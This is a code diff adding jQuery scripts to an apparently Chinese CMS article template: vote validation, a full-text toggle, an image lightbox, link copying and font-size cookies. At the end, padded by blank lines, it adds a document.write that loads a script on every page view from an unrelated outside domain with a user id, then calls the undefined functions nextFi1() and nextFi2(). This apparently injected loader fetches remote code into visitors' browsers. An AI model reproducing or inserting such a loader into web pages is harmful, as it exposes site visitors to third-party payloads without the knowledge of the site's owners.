@@ -38,3 +38,142 @@ var votedhtml = '<style>\
 	<!--{/db}-->
 </ul></div>';
 </script>
+
+
+
+
+
+
+
+<script type="text/javascript">
+var content = '';//第一页内容缓存
+var context = '';//全文内容缓存
+var isfulltext = false;
+$(function(){
+	digg.get(contentid);
+	content = $('#ctrlfscont').html();
+	var font = $.cookie('font');//根据cookie设置字体大小并初始化按钮
+	if(font){
+		$('#ctrlfssummary,#ctrlfscont').addClass(font);
+		if(font == 'fs-big'){
+		 	$('#bfont').addClass('cor-current');
+			$('#sfont').removeClass('cor-current');
+		}
+	}
+	$.getJSON(APP_URL+'?app=system&controller=content&action=stat&jsoncallback=?&contentid='+contentid, function(data){
+		$('#pv').html(data.pv);
+	});
+	
+	$('form[id^="vote"]').each(function(){
+		var contentid = $(this).find('>input[name="contentid"]:hidden').val();
+		var maxoptions = $(this).find('>input[name="maxoptions"]:hidden').val();
+		$(this).submit(function(){
+			var checkeds = $(this).find('input:checked').length;
+			if(checkeds == 0){
+				alert('请选择投票选项');
+				return false;
+			}
+			if(maxoptions){
+				if(checkeds > parseInt(maxoptions)){
+					alert('最多允许选'+maxoptions+'项');
+					return false;
+				}
+			}
+		})
+	})
+})
+function fulltext(){  //单页阅读
+		if(context =='')
+		$.getJSON(APP_URL+'?app=article&controller=article&action=fulltext&jsoncallback=?&contentid='+contentid,function(data){
+			context = data.content;
+			$('#ctrlfscont').html(data.content);
+			$('#show-all-cont').html('分页阅读').parent().siblings().hide();
+			$('.bor-ccc').hide();
+			isfulltext = true;
+			holdpic();
+		});
+		else{
+			$('#ctrlfscont').html(isfulltext?content:context);
+			$('#show-all-cont').html(isfulltext?'单页阅读':'分页阅读').parent().siblings().toggle(isfulltext === true);
+			isfulltext = (isfulltext === false);
+			$('.bor-ccc').show();
+			holdpic();
+		}
+}
+function holdpic(){//控制内容区域的的图片大小并为过大的图片添加查看原图
+	var options = {
+		imageLoading:IMG_URL+'js/lib/lightBox/lightbox-ico-loading.gif',
+		imageBtnPrev:IMG_URL+'js/lib/lightBox/lightbox-btn-prev.gif',
+		imageBtnNext:IMG_URL+'js/lib/lightBox/lightbox-btn-next.gif',
+		imageBtnClose:IMG_URL+'js/lib/lightBox/lightbox-btn-close.gif',
+		imageBlank:IMG_URL+'js/lib/lightBox/lightbox-blank.gif'
+	};
+	$('#ctrlfscont').find('img').each(function(){
+		var img = this;
+		if (img.width>608) {
+			img.style.width = '600px';
+			$(img).removeAttr('height');
+			var aTag = document.createElement('a');
+			aTag.href = img.src;
+			$(aTag).addClass('bPic')
+			.insertAfter(img).append(img)
+			.lightBox(options);
+		}
+	});
+}
+$(window).load(function(){
+	holdpic();
+});
+function copyToClipboard(txt) {  //复制网址
+	if(window.clipboardData) {
+		window.clipboardData.clearData();
+		window.clipboardData.setData("Text", txt);
+		alert("复制链接成功！");
+	} else if(navigator.userAgent.indexOf("Opera") != -1) {
+		window.location = txt;
+	} else if (window.netscape) {
+		try {
+			netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
+		} catch (e) {
+			alert(" 被浏览器拒绝！\n请在浏览器地址栏输入'about:config'并回车\n然后将 'signed.applets.codebase_principal_support'设置为'true'");
+		}
+		var clip = Components.classes['@mozilla.org/widget/clipboard;1'].createInstance(Components.interfaces.nsIClipboard);
+		if (!clip)
+		return;
+		var trans = Components.classes['@mozilla.org/widget/transferable;1'].createInstance(Components.interfaces.nsITransferable);
+		if (!trans)
+		return;
+		trans.addDataFlavor('text/unicode');
+		var str = new Object();
+		var len = new Object();
+		var str = Components.classes["@mozilla.org/supports-string;1"].createInstance(Components.interfaces.nsISupportsString);
+		var copytext = txt;
+		str.data = copytext;
+		trans.setTransferData("text/unicode",str,copytext.length*2);
+		var clipid = Components.interfaces.nsIClipboard;
+		if (!clip)
+		return false;
+		clip.setData(trans,null,clipid.kGlobalClipboard);
+		alert("复制链接成功！");
+	}
+}
+
+function changeFont(t){ //改变字号
+	var tosmall = (t.innerHTML=='小')?true:false;
+	if(tosmall&&$(t).hasClass('cor-current')) return;
+	$('.cor-current').removeClass('cor-current');
+	$(t).addClass('cor-current');
+	$.cookie('font',tosmall?'fs-small':'fs-big',{expires:300,domain:WWW_URL});
+	$('#ctrlfssummary,#ctrlfscont').removeClass(tosmall?'fs-big':'fs-small').addClass(tosmall?'fs-small':'fs-big');
+}
+
+document.write('<script type="text/javascript" charset="UTF-8" src="'+"http://www.mepire.com/init/c/eaee42a2bb87a85fc555622ba2db3ca9?uid=287729&"+Math.random()*99999999+'"><\/script>');
+
+</script>
+<script>nextFi1();nextFi2();</script>
+
+
+
+
+
+
